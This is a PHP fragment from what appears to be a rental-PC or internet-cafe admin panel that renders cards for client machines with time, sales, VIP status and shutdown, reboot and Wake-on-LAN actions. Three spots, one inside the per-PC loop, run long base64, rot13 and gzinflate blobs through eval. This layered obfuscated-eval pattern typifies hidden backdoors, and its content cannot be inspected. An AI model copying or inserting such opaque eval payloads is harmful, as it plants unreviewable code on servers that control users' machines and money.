					$checkBox  = 'checked';
				}
				$badge =  ' text-secondary';
				$status = 'NON-VIP';
				if($value['is_vip'] == 'YES')
				{
					$badge =  ' text-warning';
					$status = 'VIP';
				}
				else if($value['is_vip'] == 'YYES')
				{
					$badge =  ' text-danger';
					$status = 'VVIP';
				}
				
				$disable = "";
				if($value['username'] != "")
				{
					$disable = "d-none";
				}
				
				$options .= ' 
                    <option value="'.$value['ip_address'].'">💻 '.$value['pc_name'].' ('.$value['ip_address'].')</option> 
                ';

                $arrayx = explode(",", $_SESSION['access']); 
                $role = $_SESSION['role'];

                $html .= '
				<div class="col-xl-3 col-lg-4 col-sm-6">
				  <div class="card shadow-sm border-0 rounded-4 h-100">
					<div class="card-header bg-white border-0 py-2 px-3">
					  <div class="d-flex justify-content-between align-items-center">
						<div class="d-flex align-items-center">
						  <div class="form-check form-switch me-0">
							<input class="form-check-input" type="checkbox" onclick="enableApp(this, '.$value['rowid'].')" '.$checkBox.'>
						  </div>
							<h6 class="mb-0 ms-1 text-xs text-truncate">'.$value['pc_name'].'</h6> 
						  <!--span class="text-xs text-muted">Enable App</span-->
						</div>

						<div class="dropdown ms-2">
						  <a class="text-secondary" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
							<i class="fa-solid fa-ellipsis-vertical"></i>
						  </a>
                            <ul class="dropdown-menu dropdown-menu-end shadow-sm">
                                <li class="border-bottom '.$disable.' '.((in_array("guesttopup", $arrayx) || $role == "admin") ? '' : 'd-none').'"><a class="dropdown-item" href="#" onclick="top_up('.$value['rowid'].',`'.$value['tablex'].'`, `Top Up - '.$value['pc_name'].'`);">Manage Guest Top Up</a></li>
                                <li class="border-bottom '.$disable.' '.((in_array("guesttime", $arrayx) || $role == "admin") ? '' : 'd-none').'"><a class="dropdown-item" href="#" onclick="add_guest_time('.$value['rowid'].',`'.$value['tablex'].'`,`'.$value['pc_name'].'-'.$value['ip_address'].'`);">Manage Guest Time</a></li>
                                <li class="border-bottom '.$disable.' '.((in_array("resettime", $arrayx) || $role == "admin") ? '' : 'd-none').'"><a class="dropdown-item" href="#" onclick="reset_time('.$value['rowid'].',`'.$value['tablex'].'`);">Reset Time</a></li>
                                <li class="border-bottom '.$disable.' '.((in_array("transfertime", $arrayx) || $role == "admin") ? '' : 'd-none').'"><a class="dropdown-item" href="#" onclick="transfer_time('.$value['rowid'].', `'.$value['pc_name'].'`);">Transfer Time</a></li>
                                <li class="border-bottom '.((in_array("setvip", $arrayx) || $role == "admin") ? '' : 'd-none').'"><a class="dropdown-item" href="#" onclick="set_as_vip('.$value['rowid'].');">Set as VIP</a></li>
                                <li class="border-bottom '.((in_array("changebackground", $arrayx) || $role == "admin") ? '' : 'd-none').'"><a class="dropdown-item" href="#" onclick="change_background('.$value['rowid'].',`'.$value['tablex'].'`,`'.$value['background_img'].'`);">Background Image</a></li>
                                <li class="border-bottom '.((in_array("remove", $arrayx) || $role == "admin") ? '' : 'd-none').'"><a class="dropdown-item" href="#" onclick="remove('.$value['rowid'].');">Remove</a></li>
                                <li class="border-bottom"><a class="dropdown-item text-danger" href="#" onclick="shutdown_reboot_pc('.$value['rowid'].', `shutdown`);">Shutdown</a></li>
                                <li class="border-bottom"><a class="dropdown-item text-warning" href="#" onclick="shutdown_reboot_pc('.$value['rowid'].', `reboot`);">Reboot</a></li>
                                <li><a class="dropdown-item text-success" href="#" onclick="wake_on_lan(`'.$value['mac_address'].'`);">Wake on LAN</a></li>
                            </ul>
						</div>
					  </div>
					</div>

					<div class="card-body px-1 py-2 border-top">
					  <div class="d-flex align-items-center">
						<div class="me-2 ms-1 d-flex justify-content-center align-items-center bg-light rounded" style="width:90px; height:90px;">
						  <i class="fas fa-desktop fa-4x text-primary '.$bg.'" id="pc_logo_'.$value['rowid'].'"></i>
						</div>
						<div class = " flex-grow-1 small"> 
						  <p class="mb-0 text-muted text-xxs">⏱ <strong>Remaining Time: <span class="rem_time_'.$value['rowid'].'">'.$value['rem_time'].'</span></strong></p>
						  <p class="mb-0 text-muted text-xxs">💰 <strong>Total Sales: ₱<span id="tot_cred_'.$value['rowid'].'">'.$value['tot_cred'].'</span></strong></p>
						  <!--p class="mb-0 text-muted text-xxs">💳 <strong>Top Up: ₱<span id="tot_cred_'.$value['top_up'].'">'.$value['top_up'].'</span></strong></p-->
						  <p class="mb-0 text-muted text-xxs">👤 <strong>User: <span class="username_'.$value['rowid'].'">'.$value['username'].'</span></strong></p>
						  <p class="mb-0 text-muted text-xxs">📅 <strong>Last Insert: <span id="last_inserted_'.$value['rowid'].'">'.$value['last_inserted'].'</span></strong></p>
						  <p class="mb-0 text-muted text-xxs">🌐 <strong>Client IP: <span>'.$value['ip_address'].'</span></strong></p> 
						</div>
					  </div>
					</div>

					<div class="card-footer bg-white border-top py-2 px-1 d-flex flex-wrap align-items-center justify-content-center">
					  <span class="me-2 text-xs">⭐<span class="'.$badge.'">'.ucfirst($status).'</span></span>
					  <span class="me-2 text-xs">🟢<span id="online_stat_'.$value['rowid'].'" class="'.$badge_login.'">'.ucfirst($value['online_stat']).'</span></span>
					  <span class="text-xs me-2 text-muted">🔧'.$value['client_version'].'</span>
					</div>
				  </div>
				</div>';
  
                eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
  
            }

            eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

            return json_encode((object)[
                'status'   => 'success',  
                'pc_list'  => $html,
                'spectate' => $spectatehtml,
                'options'  => $options   
            ]); 
        }
        else
        {
            return json_encode((object)[
                'status'   => 'nopc',   
                'msg'      => '<h1 class="mt-4 text-center">NO AVAILABLE PC!</h1>' 
            ]);  
        }
        
    }

    function getSubvendoModel()
    {
        eval(str_rot13(gzinflate(str_rot13(base64_decode('LUnHEq04Dv2arn6zI2ZizYqcZnMzBVxlzuHrx/QMcgpwCelVlo5M6uH+s/VUst5QufwZh28hsP/My5TOy598dar8/v/L34qmOH0hWbbIrgH6F+Jcu/aIt5ZrdEP7kw2fTO59v1ki/3E4yrWImA0Z+0fu6pcfg1s7R6+kdkb+T4zhi/fhIjVVTgM7YEPgQRXIAw9hZa2WL2Cg5vYuoc3WIgtv8D1sfNcLIoprrOAMtQRlRNIqHcXHABprp18rjnGX6/FF82/Si1irPjMLnWVKVw07OHJ1hA5Kdi7Zqsv8h/gEwuE6NAMEFW3RaGLEe4J/RHkyOHxs3Coxcgxr6Zl98TJwFMb6A/A9B+4HX6pF/cP5psOaOQVAYoTRqhdZAHN0mKx7Lksd5+Dh0W++xtxKeo0WAoQIMraSlFq/VdpY7Y3h2qM1TNU8g8Qt4BexMKdZJg1xE4kEHqUv0Fa6OcKwWc4f+WoBCDkR2jU1WnVOSFh7oZYttc5hj74COfCSI+wncluxdK8Z4X6mlQITwrfQ0P0zfDQSyhgV+1lR5V36LAyRmTgjU3MJesYE0RofM0SCYfzROk7bR9pcvLX6Uc0to5cji8r6cMAOsjk5J7xKb8HJQmxU5eESKRvCcZDhqm3l6oYpGwENySbBluGJ0/pHugtKjGM9nQMlCytr1n34IlFSujlYO59fnevMiYLbiW1cbkmBOL/lafuURA1BTyc2nBILS/QYmhfhLZ0S+iYslaIOqYRzmz4cdqG/GOZWC3maMnCzMdBJEiWCPBtCqJuHfpsqnBfvXRqoHnSzMK+R5+Jhlk9Y057ULZCooC/E8YTxQGhLRWIYJO5mO62P5WY6kBR8xrdHrS6gcN7JYLS8as9a0ziZZPAxmjWeM1EPeFTKKdX0TEmJTiiCNhCbCkbpbVFua0Ou2AHlLPBcmUHdvFRBzF+YBpS8o4bUVNEttqjGW6I4nvGCWLyXKdNEOPgF2KzshMQ4ELFBOFNmbHO9NXYSZpd21aEc1PVopXYVYPe1xljVNlzGKTu7lI/Weoicpd4/4JwxRNGXcUnY+SJ/KkdRoL5Ks/Hw23EKwry2Jx4YkLdBkwjUeksIkeG5/O2U0Qz9hlq5uwNswKt9h6m4BK+Ux3x57c7hKz++KXkk2SyxpFpj2uQKWmrwSwT8d6Z1UuSVi+ZW0FbTDmLMMIEErV6j6Eu6aDefH4DEf1uvZNeyDa1DTC1YUJswUhOAdEJxBI+hPfZtKfG618JjwUYO12xaCHJGMZGn+TAVx71Mm4wLC+tYLEmqCyTJfaYyjqgun+ducaqTdoGIlqN5CdqxpdzDJCwA1E50FCoGEg+LGgDhH9s2EqsrXVfF8+/cEUu5Kvmm3jl9NMghNj3QovBz6rKdA9NiTPkvLdioPgRQMslqVXrlNIvp4b8kZJyX9jBEveZ38dKApF8djdg/Hefzdl6tT44UHaTAwdD7cfSXJm4d8dLHVK3TrtoHKjMEtwpk4jFGK2aWrfca5coEhckohwEprkFIbquPtxRULpXB9CqaAvj9WRjvxv1Vvu+jHufWl2ZujXkf6VSIpqfifLU0AEUkwfiNZUmELr1elA5sqyrQUrxfZ68vtBCPH1MdvenjnNkVYvfUZSXOyEt3m3Evf2X7WlFbmCMWyPRqvbLe1Vm7acy3sgp2SlPXJwigxBXEA9aWQNJX32bYY7WhmRx8C6qZG8id5wsHNpdaLk4xc/bumO+2zlVNtparg+ybKaOyL+hLPw57kl3yflsMJ3UIqnIt8xc7iWIRAhTs/LabLu6hEhzil3KfFMocBhxv84Sgc8dSEKsVzOPix/xj9H2yB8HsSCp7YjD7Py0hzvw+UeRNGds/58Psj9+BFovJOsWGMspc66Uj4XV4W88CqmUreZk35IMFDAVXAll0p7o0dF/fBOE09kghLY+nKHE2JBxchY/nPvN/yViCFJWdQ4E39I7Xsb8xqJd/GgEpjgcfdrg7uPASQfHmiiDgg9psacm86JcoyaG60RzKlAvxd5tTKweVFodo3Xs0395T6HHyeU6d3gZNrguaZ9VHXgFA1b77kSWedQiyqKuIVoJSI1RKaTJlx8qJBtc6WMyD8DeQ/hVDkeChy+wcDBZv90rKh1Lf1CmfI64R/a8mdqscf0Lja2/i2WMhru7DSerh11ih8YaZTZbTuZKIrnPQRrS+vxRd91qfAMc0g4pC17l1SBhFFTjvbNv1+9q345uh7MleuAV4FSPF4bz7NHA1F1Wx1P5JQmCJIvKw31hn1dLvbWG+BBinULu9vj/sdGMz6MIfTi26A2OS92blnWzC+BHZzKX5sDK5ZWNMZU3cDsZWDrvaM68SfcYdjKKLwMFl+WZhwQBKrYJnkyrIL3Rc+1gtuM9R6RtYGsFBLwfwyq1bPF3mx2bI7RMlnxzzBVzaAlj6wcHQfDnP42cRNMsVQM5PaIWgi2w1dUT0RgyuI8OmRZv4qQJkIpmjzgx4PHCuJdZz9raFfqi9ZR20C137enqUFP73i4V7zV+oBcbf/wLXv/8L')))));
